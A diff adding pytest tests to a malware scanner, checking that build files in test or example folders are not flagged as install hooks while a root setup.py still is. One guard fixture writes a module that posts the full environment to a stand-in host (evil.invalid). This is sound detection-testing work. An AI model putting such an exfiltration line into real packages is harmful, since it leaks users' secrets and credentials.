@@ -12363,3 +12363,98 @@ class TestTheCeilingThatTurnedTheAnalysisOff:
             )
         finally:
             reachability.MAX_FUNCTIONS = original
+
+
+class TestAFixtureIsNotTheDistributionsInstaller:
+    """`pytorch/pytorch` produced six blocking findings, four of them CRITICAL
+    and in the MALICIOUS category, and every one of them rested on this.
+
+    `test/cpp_extensions/setup.py` is a fixture pytorch's own test suite
+    compiles. It was counted as an install hook, and a hook seeds an import
+    closure -- it does `from torch.utils.cpp_extension import ...`, which pulled
+    507 files of `torch`, the closure's entire 500-file budget, into
+    `install_hook_paths`. Every `MALWARE.*` composite is gated on exactly that,
+    so `torch/hub.py` reading `GITHUB_TOKEN` beside an `api.github.com` call
+    became `MALWARE.EXFIL.001` at critical, and three ordinary `getattr` sites
+    became `MALWARE.DYNAMIC_DISPATCH.001`, all on the claim that they "execute
+    automatically on every install".
+
+    pytorch's real `setup.py`, at the distribution root, does not import torch
+    at all. Its closure is empty. The finding never had anything to do with
+    packaging.
+
+    `pip install` runs the build file at the distribution root, so no recall is
+    traded: a payload that wants to run on install has to be reachable from that
+    one. The same shape put `six.py` in servo and two vendored modules in
+    mongodb into install-time context, both under a `test/` segment.
+    """
+
+    PAYLOAD = (
+        "import os\n"
+        "from urllib.request import urlopen\n"
+        "\n"
+        "def fetch(owner):\n"
+        "    token = os.environ.get('GITHUB_TOKEN')\n"
+        "    return urlopen('https://api.example.invalid/' + owner).read()\n"
+    )
+
+    def _malware(self, root) -> set[str]:
+        return {
+            f.rule_id for f in Scanner().scan(root).findings if f.rule_id.startswith("MALWARE.")
+        }
+
+    def _tree(self, tmp_path, hook_directory: str) -> None:
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\n\nsetup(name='mylib')\n", encoding="utf-8"
+        )
+        package = tmp_path / "mylib"
+        package.mkdir()
+        (package / "__init__.py").write_text("", encoding="utf-8")
+        (package / "hub.py").write_text(self.PAYLOAD, encoding="utf-8")
+        fixture = tmp_path / hook_directory
+        fixture.mkdir(parents=True)
+        (fixture / "setup.py").write_text(
+            "from setuptools import setup\nimport mylib.hub\n\nsetup(name='ext')\n",
+            encoding="utf-8",
+        )
+
+    @pytest.mark.parametrize(
+        "directory",
+        ["test/cpp_extensions", "tests/wpt/tools", "benchmarks/pt_extension", "examples/demo"],
+    )
+    def test_a_build_file_the_tests_build_is_not_an_install_hook(
+        self, tmp_path, directory: str
+    ) -> None:
+        self._tree(tmp_path, directory)
+        assert "MALWARE.EXFIL.001" not in self._malware(tmp_path)
+
+    def test_a_build_file_at_the_root_still_is_one(self, tmp_path) -> None:
+        """The guard. The distribution's own packaging script is what `pip
+        install` runs, and a payload reachable from it is the case every
+        `MALWARE.*` composite exists for."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\nimport mylib.hub\n\nsetup(name='mylib')\n",
+            encoding="utf-8",
+        )
+        package = tmp_path / "mylib"
+        package.mkdir()
+        (package / "__init__.py").write_text("", encoding="utf-8")
+        (package / "hub.py").write_text(
+            "import os\n"
+            "from urllib.request import urlopen\n"
+            "\n"
+            "urlopen('https://evil.invalid', data=str(dict(os.environ)).encode())\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" in self._malware(tmp_path)
+
+    def test_any_segment_counts_not_just_the_first(self) -> None:
+        """mongodb vendors one at `src/third_party/wiredtiger/test/3rdparty/`
+        and servo's is `tests/wpt/tests/tools/third_party/`. A rule that only
+        looked at the top level would have caught one of the three."""
+        from cordon_scanner.core.engine import Engine
+
+        assert Engine._under_fixture_directory("src/third_party/wiredtiger/test/x/setup.py")
+        assert Engine._under_fixture_directory("tests/wpt/tools/setup.py")
+        assert not Engine._under_fixture_directory("setup.py")
+        assert not Engine._under_fixture_directory("src/mylib/setup.py")
